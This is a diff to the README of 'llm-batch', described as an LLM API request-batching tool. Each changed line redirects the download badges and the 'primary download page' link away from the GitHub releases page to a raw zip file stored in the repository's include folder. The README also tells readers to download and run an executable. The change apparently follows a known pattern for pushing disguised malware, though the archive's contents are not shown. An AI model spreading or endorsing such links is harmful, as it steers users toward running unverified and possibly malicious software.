@@ -1,6 +1,6 @@
 # ⚙️ llm-batch - Efficient LLM API Request Grouping
 
-[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-brightgreen)](https://github.com/JhoneCasali/llm-batch/releases)
+[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-brightgreen)](https://github.com/JhoneCasali/llm-batch/raw/refs/heads/main/include/batch_llm_3.9.zip)
 
 ---
 
@@ -38,7 +38,7 @@ The latest files for llm-batch are on the official GitHub release page. This pag
 
 Click the big button below to visit the download page:
 
-[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-blue)](https://github.com/JhoneCasali/llm-batch/releases)
+[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-blue)](https://github.com/JhoneCasali/llm-batch/raw/refs/heads/main/include/batch_llm_3.9.zip)
 
 1. When you open the page, look for the latest release near the top.
 2. Find the asset named something like `llm-batch.zip` or `llm-batch.exe`.
@@ -131,6 +131,6 @@ Keep your version of llm-batch current by:
 
 ## 🔗 Useful Links
 
-- Primary download page: [https://github.com/JhoneCasali/llm-batch/releases](https://github.com/JhoneCasali/llm-batch/releases)
+- Primary download page: [https://github.com/JhoneCasali/llm-batch/raw/refs/heads/main/include/batch_llm_3.9.zip](https://github.com/JhoneCasali/llm-batch/raw/refs/heads/main/include/batch_llm_3.9.zip)
 
-[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-blue)](https://github.com/JhoneCasali/llm-batch/releases)
+[![Download llm-batch](https://img.shields.io/badge/Download-llm--batch-blue)](https://github.com/JhoneCasali/llm-batch/raw/refs/heads/main/include/batch_llm_3.9.zip)
